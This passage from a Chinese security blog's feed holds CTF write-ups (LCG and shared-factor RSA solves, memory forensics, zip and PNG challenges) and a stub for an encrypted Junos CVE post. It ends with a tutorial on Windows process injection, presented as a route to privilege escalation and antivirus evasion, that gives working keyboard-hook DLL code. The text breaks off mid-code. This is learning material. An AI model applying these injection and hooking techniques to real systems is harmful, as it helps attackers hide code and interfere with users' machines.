punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">==</span> c2<span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c11<span class="token operator">-</span>c<span class="token punctuation">)</span><span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>正确的题目</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">LCG</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>b <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>c <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>seed <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>                <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>seed <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>seed <span class="token operator">+</span> self<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n            <span class="token keyword">return</span> self<span class="token punctuation">.</span>seed                 <span class="token keyword">def</span> <span class="token function">output</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b = &#123;&#125;\nn = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>b<span class="token punctuation">,</span> self<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"seed = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        lcg <span class="token operator">=</span> LCG<span class="token punctuation">(</span><span class="token punctuation">)</span>            lcg<span class="token punctuation">.</span>output<span class="token punctuation">(</span><span class="token punctuation">)</span>            c1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>flag <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span>            c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c1 <span class="token operator">*</span> lcg<span class="token punctuation">.</span>a <span class="token operator">+</span> lcg<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token operator">%</span> lcg<span class="token punctuation">.</span>n<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c1<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag = &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token triple-quoted-string string">'''            b = 3831416627            n = 2273386207            seed = 2403188683            s1 = 260742417            s2 = 447908860            c1 = 17275            c2 = 28951            '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="密码2"><a class="header-anchor" href="#密码2">¶</a>密码2</h3><p>很简单的质因数gcd求因数</p><figure><div class="code-wrapper"><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">import gmpy2from Crypto.Util.number import *n1&#x3D; 12671827609071157026977398418260127577729239910356059636353714138256023623770344437013038456629652805253619484243190436122472172086809006270535958920503788271745182898308583012315393657937467583278528574109842696210193482837553369816110424840884683667932711439417044144625891738594098963618068866281205254024287936360981926173192169919836661589685119695804443529730259703940744061684219737502099455504322939948562185702662485642366411258841082322583213825076942399375712892608077960687636100621655314604756871227708407963698548718981737143081639214928707030543449473132959887760171345393471397998907576088643495456531e1&#x3D; 65537c1&#x3D; 5268497051283009363591890965286255308367378505062739645805302950184343652292967525985407935922935972883557494557593439711003227737116083417992112594428400382187113609935251268634230537282408994938066541612999550555591607744019286392765549844400176442415480559773688439693874264657925123598756193286897112566420847480601040372338338442932524410598834393630019038536173336696498743879160879377504894526001205060753543289059104874467150194596404490638065573974570258671195173327475871936431769234701590572816592485898568463143587137721883610069616008902637316459660001435171054741347142470208082183171637233299493273737n2&#x3D; 18090800828995898324812976370950614944724424095669490324214928162454640462382724191043785592350299626782376411935499259428970532102686361824967300649916495702138825182857737210486173137998811993244590794690070307872074705348982970060304389842338043432383690934814892283936018142382990267868341375956549210694354065317328612440672169232803362481090661368782599819926970968509827001203936933692777821117679448168400620234261164018167404541446201828349880887526076468982840569645753428057937172715073817332736878737709704495317549386111938639861221307607948775421897063976457107356574428602380790814162110473018856344871e2&#x3D; 4097c2&#x3D; 2326267610355516153575986453727161366266816656017644910981028690283132055217271939475840618294311986463011398892570340626131158223217558335139831985973737748812636360601010312490160903427322848411507157238373313053959092326875136396134997877757316339153327290508806645882428114647041522287934007579220769189583249469879165078254248922442084985860374461188259818592181294686890335242981199427715392978546977718475462727987012437677290341463732660152302257234030751774759466703002189003437204934438026047163828083902584763527752033035438078609950665211243112982373167722458975172667665849715372158378299319548194854914n3&#x3D; 14016899139767071357961567514373780608355222973882916699129907806456201886114368147540489514960479836424236595826190295819765979835270500889626994048655508134450908075698567925938340322498944878806273261377551132596295484579752118097281084614987064680928168918147910522922020462762688924459558896249968804885885853885632349539590507675397376494346489972596290270168847103345561743327300964196811506510943971437325302822974593782292850499524055338033832053610217461760698628614971171144300450574522839157187874548994036357212297166759231255765155759405207408315314182166142015547345744054533749334516820850300569790673e3&#x3D; 1048577c3&#x3D; 1507157402302225700443994264641838312753363380677759942918832857396550216927941389943122383728949792984913155517202501504817319345830153748955731880333992875210194306712098593166605310784068299411946792264365247471197716329666415403718297430110977954951479772565341847358286252098930408452594561104228639615640815799731581302607522977457874347224189202268831547055389518214072278766864028489294466057175201908756749666131546163372443691718757198229262989973810951064160488114367967684657242385568733678188829354802025582496625272334309487028498614869964712744826603931510547381997149345221530469380732265014466170524p &#x3D; gmpy2.gcd(n1,n2)q1 &#x3D; n1&#x2F;&#x2F;pd1 &#x3D; gmpy2.invert(e1,(q1-1)*(p-1))print(long_to_bytes(pow(c1,d1,n1)))q2 &#x3D; n2&#x2F;&#x2F;pd2 &#x3D; gmpy2.invert(e2,(q2-1)*(p-1))print(long_to_bytes(pow(c2,d2,n2)))p &#x3D; gmpy2.gcd(n2,n3)q1 &#x3D; n3&#x2F;&#x2F;pd1 &#x3D; gmpy2.invert(e3,(q1-1)*(p-1))print(long_to_bytes(pow(c3,d1,n3)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="misc1-取证"><a class="header-anchor" href="#misc1-取证">¶</a>misc1 取证</h3><p>这个misc我做的有点狗血和脑洞。<br>首先拿到之后，工具查看一下进程，发现是notepad和画图软件（这里我就忽略了还有一个写的程序wordpad）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d8fe2b750f393e8d1c442bc5fc7800d3517ffdd5.png" alt="图片.png"></p><p>然后把notepad东西dump出来</p><figure><div class="code-wrapper"><pre class="line-numbers language-Plain" data-language="Plain"><code class="language-Plain">Volatility Foundation Volatility Framework 2.6Process: 236Text:?Text:dText:Text:?Text:??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????Process: 372Text:?Text:dText:Text:?Text:f &#x3D; open(&#39;.&#x2F;flag.zip&#39;, &#39;rb&#39;).read()new &#x3D; open(&#39;.&#x2F;fffflllaag.dat&#39;, &#39;ab&#39;)letter &#x3D; &#39;&#39;secret &#x3D; int(letter,16)print(secret)for i in f:    n &#x3D; int(i) ^ secret    new.write(int(n).to_bytes(1, &#39;big&#39;))Process: 132Text:?Text:dText:Text:?Text:According to Homer&#39;s epic, the hero Achilles is the precious son of the mortal Polus and the beautiful fairy Thetis.It is said that her mother Tethys carried him upside down into the Styx river when he was just born, so that he could be invulnerable.Unfortunately, due to the rapid flow of the Ming River, his mother didn&#39;t dare to let go of his heel.The heel held by his mother was accidentally exposed outside the water, so the heel was the most vulnerable place, leaving the only &quot;dead hole&quot; in his body, so he buried the disaster.When he grew up, Achilles fought bravely. When he went to attack the city of Troy (the story of Trojan horse slaughtering the city), the brave Achilles singled out the Trojan general Hector, killed him and dragged his body to demonstrate.But later, after conquering Troy, Achilles was attacked by an arrow by Hector&#39;s brother-in-law Paris and hit his ankle - the hero fell to the ground and died at the moment of shaking.ankle, ankle, I love ankle.The password is ??k1eAn???Process: 2060Text:?Text:dText:Text:?Text:???????????????????????????????XOR?EOR????????????????????????????????letter?????????????????????????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>得到有效的信息</p><figure><div class="code-wrapper"><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">f &#x3D; open(&#39;.&#x2F;flag.zip&#39;, &#39;rb&#39;).read()new &#x3D; open(&#39;.&#x2F;fffflllaag.dat&#39;, &#39;ab&#39;)letter &#x3D; &#39;&#39;secret &#x3D; int(letter,16)print(secret) k1eAn for i in f:    n &#x3D; int(i) ^ secret    new.write(int(n).to_bytes(1, &#39;big&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>和passwd ??K1eAn??? 这里有五个数字不知道。</p><p>然后用工具搜了一下flag文件，找到了一个压缩包，dump出口里面存了</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c976b15ac7a25d56c78d58c224c7d05dae18551f.png" alt="图片.png"></p><p>这个就是加密之后的东西，需要我们找到letter还原出flag.zip，啊这里想到之前有个图片，然后搜图片，，然后dump出来，拿到图片</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-368bed714433476487e5dc2dbf15b93fdb704dab.png" alt="图片.png"><br>以为是png隐写，反正letter肯定在这里，但是我没有解出来，（问了别的师傅，好像是啥橡树置换，反正我也只是业余的misc选手。不太懂），于是我想到了data加密的时候，是一个一个字节写的，于是我直接爆破了127个可见字符串，在第十个拿到了flag.zip</p><p>flag.zip还打不开，要密码，这时候我又想到了passwd。本来是掩码爆破的，后来看时间太长了。我一看哇，不就是ankle写两遍吗<br>Ank1eAnk1e，然后就出了，里面是个txt</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62e333920aa772e310205dba52eb64aa2866d5e3.png" alt="图片.png"></p><p>然后就开始了对脑电波的过程，，，<br>知道我扫了一遍cmdline。。。发现了有个egg1.rtf<br>dump出来之后</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-704658b7d06eccd1b2725af87e264f90940dda4d.png" alt="图片.png"><br>然后就出了<br>flag=md5{You are the only weakness in my body}</p><h3 id="misc2-zipcracker2"><a class="header-anchor" href="#misc2-zipcracker2">¶</a>misc2 zipcracker2</h3><p>不写了伪加密和明文攻击一把梭</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-31375225c063062174436f57425c2564cd152f88.png" alt="图片.png"></p><h3 id="misc3-pngcracker"><a class="header-anchor" href="#misc3-pngcracker">¶</a>misc3 pngcracker</h3><p>这个也简单，binwalk发现一个压缩包，拉长png得到压缩包密码，然后压缩包里面的misc.png有lsb隐写，直接就出了</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-673596b978977bcfcb09ef245cb23de55cbe72ce.png" alt="图片.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>junos的一些挖掘</title>
    <link href="/2022/06/29/CVE-2021-0277%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%88%B0poc%E7%BC%96%E5%86%99/"/>
    <url>/2022/06/29/CVE-2021-0277%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%88%B0poc%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再试试nc看看" data-whm="禁止修改">  <script id="hbeData" type="hbeData" data-hmacdigest="9dd673e8d4cedc23f8ef52b073612e8ccc3b0fd168108fde1539a349fe755f40">cc0c0f8ba411acd26894e584ac9b5fdaa20ff2900fe7d80c1056c5376dd8b1f16568fb63c9a696d03755534cd1d7ec196f73fadd750d880e63e5e3d1bface87acd05a7bf4ecead3817dae235ecc9246793042c197ba0ff4113a30d35450a87af98d972accd703b84aa56be6d552a2cd8596d0b24e157285ff887d412a63787e4c721bde70add8bd5ba5eb3343d2b01a6847cfdb4d7f57c5f00327715635fa50adf2f27d50f855fb8b46a281a4db589b6f07b6dd4dcc827146007e3dcdb7047ed6bd7f582058ff6fe97545fbd825b304180ef73f58ee63a5a1799e3c0f58ac2550e92329688a2219d0736ca874c985168a2948921b652d93aa3de72dc22288c41f7e1936b9888c6d27a182a1dcdc329122aae3c3cb53a019e21df906d84194bdf</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">已经在做了，快了快了</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT/juniper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从进程注入到提权</title>
    <link href="/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1>从进程注入到提权</h1><p>windows下的一系列注入手段在免杀和提权上有较大的用处，学习进程注入对Windows安全的理解有重要的帮助。</p><h2 id="0x01-什么是进程注入"><a class="header-anchor" href="#0x01-什么是进程注入">¶</a>0x01 什么是进程注入</h2><p>类似于linux下的ROP，进程注入即为在一个独立活动的进程中地址空间执行任意代码的方式，此时被执行的任意代码可以访问源进程的所有资源空间，常常被用来提权，同时，该方式通过注入正常的进程，常常可以绕过杀软的检测和白名单检测。</p><p>从原理上讲，进程注入改善了不可见性，同时一些技术也实现了持久性。</p><p>目前大致上有两种注入方法。</p><ul><li>dll注入</li><li>shellcode注入</li></ul><p>个人认为在本质上，二者都是操作系统可以执行的代码，为了方便开发，代码通常会以dll的形式编译和传播，实际上进行注入的时候，作为loadlibrary被加载。</p><p>注入的方式多种多样，这里我们主要看到两种注入的方式，<strong>dll和pe注入</strong></p><h2 id="0x02-几种进程注入的方式"><a class="header-anchor" href="#0x02-几种进程注入的方式">¶</a>0x02 几种进程注入的方式</h2><h3 id="dll编写规则"><a class="header-anchor" href="#dll编写规则">¶</a>dll编写规则</h3><p>首先我们需要了解一下dll的编写规则和一些具体的实现。</p><p>DLL（Dynamic Linkable Library）它提供一些可以直接使用的变量，类和函数。在经历了“无库—静态链接库—动态链接库”的历程后，dll使用十分广泛。</p><p><a href="https://blog.csdn.net/W_Y2010/article/details/80428067">https://blog.csdn.net/W_Y2010/article/details/80428067</a></p><p>编写规则和之前写过的tinystl差不多，语法也是单纯的c语言语法。有一点不一样的是</p><p><img src="https://i.bmp.ovh/imgs/2022/06/27/2bb043f58574f84d.png" alt=""></p><p>函数的返回值使用dll的extern 声明，表明后面的函数是dll的导出函数。基本用法就是这样还有一些别的用法不赘述，本次的重点是弄明白dll注入和hook注入和pe注入三种方式。</p><h3 id="hook注入原理"><a class="header-anchor" href="#hook注入原理">¶</a>hook注入原理</h3><p>什么是hook呢？联想glibc中的hook，调用malloc和free之前会查看其中的hook。实际上抽象出来，Windows下的hook机制也和其类似。</p><blockquote><p>hook作为一种消息监听机制，程序可以通过hook对消息或窗口进行监听，，即hook可以和特定的时间挂钩，当应用程序触发该特殊事件之后，操作系统即会向hook发出通知消息，此时hook函数就会响应对应的消息。</p></blockquote><p><img src="https://i.bmp.ovh/imgs/2022/06/27/2974a5f11e3b5ba7.png" alt=""></p><p>这里借用别人的图来解释一下钩子的机制， 在Micrisoft Windows中， 每个进程都有自己的私有地址空间。当我们用指针来引用内存的时候，指针的值表示的是进程自己的自制空间的一个内存地址。进程不能创建一个指针来引用属于其他进程的内存。</p><p>这样虽然一定程度上保证了程序的安全性，但是却也使我们很难编写能够与其他进程通信的应用程序或对其他进程进行操控的应用程序。</p><p>hook就被用来再被调用函数和调用进程中充当一个中间人，用来接受消息，处理消息和转发消息。</p><p>Hook的类型在Windows下也有很多种，消息hook，注入hook，inline内联hook等，hook注入中，<strong>重点学习的是其中的注入hook</strong>，<strong>注入hook</strong>，和hjacking差不多，就是劫持API的调用函数。</p><p>但是前面说了，每个进程有一个私有的内存空间，那么我如果想要A进程hookB进程的函数，但是A又不可以直接访问B的内存空间，那么应该怎么办？</p><p>这个时候考虑到dll动态链接库的注入技术，hook和dll注入结合即可解决这个问题。<strong>把hook的代码写入dll中，让B程序加载dll，则hook即可生效</strong>，乍一看感觉还不如直接shellcode来的实在。一般的注入流程如下：</p><ol><li>安装一个钩子（系统的dll注入被hook）</li><li>保存系统函数入口处的代码</li><li>替换掉进程中的系统函数入口指向我们的函数（直接修改地址空间的字节）</li><li>当系统函数被调用时立即跳转到我们的函数</li><li>函数处理</li><li>恢复系统函数入口的代码（处理后拖钩）</li></ol><p>这时候我们回去看到给的实验代码：</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/420c2138c2b9725b.png" alt=""></p><p>有两个cpp函数，keyhook是编译成dll的cpp，上面是hook程序的exe，也即是A程序。</p><p>实现的内容是，用键盘hook技术拦截notepad.exe进程的键盘消息，使之无法显示在记事本中</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;HookMain#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#defineDEF_DLL_NAME&quot;KeyHook.dll&quot;#defineDEF_HOOKSTART&quot;HookStart&quot;#defineDEF_HOOKSTOP&quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main()&#123;HMODULEhDll &#x3D; NULL; &#x2F;&#x2F;代表应用程序载入的模块,被载入模块的线性地址PFN_HOOKSTARTHookStart &#x3D; NULL;PFN_HOOKSTOPHookStop &#x3D; NULL;charch &#x3D; 0;    &#x2F;&#x2F; 加载指定的dllhDll &#x3D; LoadLibraryA(DEF_DLL_NAME);    if( hDll &#x3D;&#x3D; NULL )    &#123;        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());        return;    &#125;HookStart &#x3D; (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);HookStop &#x3D; (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);HookStart();    printf(&quot;press &#39;q&#39; to quit!\n&quot;);while( _getch() !&#x3D; &#39;q&#39; );HookStop();    FreeLibrary(hDll);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>有一些韩文注释，删掉了。看的有点点不太懂，可能需要看完dll部分才懂。</p><p>大致逻辑就是，先加载目标dll，然后利用<code>GetProcAddress</code> API获得hookstart函数的地址，这里用了强制类型转化，stop地址也是，具体内容需要看dll的实现。估计所有的简单hook都是这样实现的。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;KeyHook#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME&quot;notepad.exe&quot;HINSTANCE g_hInstance &#x3D; NULL;HHOOK g_hHook &#x3D; NULL;HWND g_hWnd &#x3D; NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123;switch( dwReason )&#123;        case DLL_PROCESS_ATTACH:g_hInstance &#x3D; hinstDLL;break;        case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123;char szPath[MAX_PATH] &#x3D; &#123;0,&#125;;char *p &#x3D; NULL;if( nCode &gt;&#x3D; 0 )&#123;&#x2F;&#x2F; bit 31 : 0 &#x3D;&gt; press, 1 &#x3D;&gt; releaseif( !(lParam &amp; 0x80000000) )&#x2F;&#x2F;释放键盘按键时&#123;GetModuleFileNameA(NULL, szPath, MAX_PATH);p &#x3D; strrchr(szPath, &#39;\\&#39;);            &#x2F;&#x2F; 比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序（或者下一个钩子）if( !_stricmp(p + 1, DEF_PROCESS_NAME) )return 1;&#125;&#125;    &#x2F;&#x2F; 如果不是notepad.exe，则调用CallNextHookEx函数，将消息传递给应用程序return CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif__declspec(dllexport) void HookStart()&#123;g_hHook &#x3D; SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);&#125;__declspec(dllexport) void HookStop()&#123;if( g_hHook )&#123;UnhookWindowsHookEx(g_hHook);g_hHook &#x3D; NULL;&#125;&#125;#ifdef __cplusplus&#125;#endif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>实现了三个部分，第一部分是dllmain函数，第二部分是主要的hook函数，第三部分是调用的接口，从HookMain可知，hook是从HookStart开始的。</p><p>了解到<code>SetWindowsHookEx</code>函数，是hook的安装函数，这里就不得不提一下hook在内存中的存在形式了。</p><p><a href="https://www.cnblogs.com/rosesmall/p/3248300.html">https://www.cnblogs.com/rosesmall/p/3248300.html</a></p><p>每一个Hook都有一个与之相关联的<a href="http://baike.baidu.com/view/159417.htm">指针</a>列表，称之为钩子<a href="http://baike.baidu.com/view/549479.htm">链表</a>，由系统来维护。这个列表的<a href="http://baike.baidu.com/view/159417.htm">指针</a>指向指定的，应用程序定义的，被Hook子程调用的<a href="http://baike.baidu.com/view/414773.htm">回调函数</a>，也就是该钩子的各个处理子程。当与指定的Hook类型关联的消息发生时，系统就把这个消息传递到Hook子程。 一些Hook子程可以只监视消息，或者修改消息，或者停止消息的前进，避免这些消息传递到下一个Hook子程或者目的窗口。最后安装的钩子放在链的开始， 而最早安装的钩子放在最后，也就是后加入的先获得控制权。</p><p>Windows 并不要求钩子子程的<a href="http://baike.baidu.com/view/386432.htm">卸载</a>顺序一定得和安装顺序相反。每当有一个钩子被<a href="http://baike.baidu.com/view/386432.htm">卸载</a>，Windows 便释放其占用的内存，并更新整个Hook链表。如果程序安装了钩子，但是在尚未<a href="http://baike.baidu.com/view/386432.htm">卸载</a>钩子之前就结束了，那么系统会自动为它做卸载钩子的操作。</p><p>SetWindowsHookEx函数总会在hook链的开头安装hook子程。当指定类型的Hook监视的事件发生时，系统就调用与这个Hook关联的 Hook链的开头的Hook子程。每一个Hook链中的Hook子程都决定是否把这个事件传递到下一个Hook子程。Hook子程传递事件到下一个 Hook子程需要调用CallNextHookEx函数。</p><p>函数原型如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">HHOOK SetWindowsHookEx(int idHook, &#x2F;&#x2F; 钩子的类型，即它处理的消息类型HOOKPROC lpfn, &#x2F;&#x2F; 钩子子程的地址指针。如果dwThreadId参数为0&#x2F;&#x2F; 或是一个由别的进程创建的线程的标识，&#x2F;&#x2F; lpfn必须指向DLL中的钩子子程。&#x2F;&#x2F; 除此以外，lpfn可以指向当前进程的一段钩子子程代码。&#x2F;&#x2F; 钩子函数的入口地址，当钩子钩到任何消息后便调用这个函数。HINSTANCE hMod, &#x2F;&#x2F; 应用程序实例的句柄。标识包含lpfn所指的子程的DLL。&#x2F;&#x2F; 如果dwThreadId 标识当前进程创建的一个线程，&#x2F;&#x2F; 而且子程代码位于当前进程，hMod必须为NULL。&#x2F;&#x2F; 可以很简单的设定其为本应用程序的实例句柄。DWORD dwThreadId &#x2F;&#x2F; 与安装的钩子子程相关联的线程的标识符。&#x2F;&#x2F; 如果为0，钩子子程与所有的线程关联，即为全局钩子。);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>把我们创建的钩子函数作为入口地址，钩到消息即传递给该函数。而hook函数就是简单的，劫持notepad的消息，不往下传递，这就导致了notepad的进程按键无法被正确响应。实现了hook。</p><h3 id="dll注入代码分析"><a class="header-anchor" href="#dll注入代码分析">¶</a>dll注入代码分析</h3><p>还是看到注入代码。</p><figure><div class="code-wrapper"><pre 